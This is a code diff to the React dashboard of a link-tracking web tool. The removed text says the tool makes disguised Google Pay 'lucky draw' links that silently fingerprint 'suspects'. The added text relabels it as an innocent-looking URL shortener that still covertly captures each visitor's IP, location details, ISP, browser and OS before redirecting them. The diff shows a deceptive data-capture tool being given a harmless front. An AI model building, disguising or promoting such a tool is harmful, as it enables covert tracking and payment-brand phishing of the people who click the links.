@@ -146,10 +146,10 @@ export default function Dashboard() {
           <div className="lg:col-span-1">
             <div className="bg-surface-elevated border border-surface-border rounded-2xl p-6">
               <h2 className="font-display text-xl tracking-wider mb-1">
-                GENERATE <span className="text-primary">LINK</span>
+                URL <span className="text-primary">SHORTENER</span>
               </h2>
               <p className="font-body text-xs text-text-muted mb-6">
-                Creates a disguised GPay-looking link that captures device data
+                Paste any URL → get a short tracking link → captures visitor data on click
               </p>
 
               {error && (
@@ -198,18 +198,18 @@ export default function Dashboard() {
               <form onSubmit={handleGenerate} className="space-y-4">
                 <div>
                   <label className="block font-body text-xs text-text-secondary uppercase tracking-wider mb-1.5">
-                    Destination URL <span className="text-accent">*</span>
+                    URL to Shorten <span className="text-accent">*</span>
                   </label>
                   <input
                     type="url"
                     value={destinationUrl}
                     onChange={(e) => setDestinationUrl(e.target.value)}
-                    placeholder="https://example.com/payment..."
+                    placeholder="https://paytm.com/"
                     required
                     className="w-full bg-surface border border-surface-border rounded-lg px-4 py-3 font-body text-sm text-text-primary placeholder:text-text-muted focus:outline-none focus:border-primary transition-colors"
                   />
                   <p className="font-body text-xs text-text-muted mt-1">
-                    Suspect will be redirected here after capture
+                    Visitor will be redirected here after data is captured
                   </p>
                 </div>
                 <div>
@@ -241,9 +241,9 @@ export default function Dashboard() {
               <div className="mt-4 p-3 bg-surface border border-surface-border rounded-lg">
                 <p className="font-body text-xs text-text-muted">
                   <span className="text-primary font-semibold">How it works: </span>
-                  The link appears as a Google Pay lucky draw page. When opened,
-                  it silently captures IP, location, device info and browser
-                  fingerprint.
+                  Paste any URL → share the short link → when clicked, it silently
+                  captures IP, country, ISP, browser &amp; OS in the background,
+                  then instantly redirects the visitor to your original URL.
                 </p>
               </div>
             </div>
@@ -282,8 +282,8 @@ export default function Dashboard() {
                             </span>
                             <span
                               className={`px-2 py-0.5 rounded-full text-xs font-mono flex-shrink-0 ${link.active
-                                  ? "bg-primary/10 text-primary"
-                                  : "bg-text-muted/10 text-text-muted"
+                                ? "bg-primary/10 text-primary"
+                                : "bg-text-muted/10 text-text-muted"
                                 }`}
                             >
                               {link.active ? "ACTIVE" : "INACTIVE"}
@@ -478,8 +478,8 @@ function PaymentModal({ onClose, uid, fetchUserProfile }) {
                   key={i}
                   onClick={() => setSelected(i)}
                   className={`w-full text-left p-4 rounded-xl border transition-all ${selected === i
-                      ? "border-primary bg-primary/10 shadow-glow"
-                      : "border-surface-border bg-surface hover:border-primary/40"
+                    ? "border-primary bg-primary/10 shadow-glow"
+                    : "border-surface-border bg-surface hover:border-primary/40"
                     }`}
                 >
                   <div className="flex items-center justify-between">
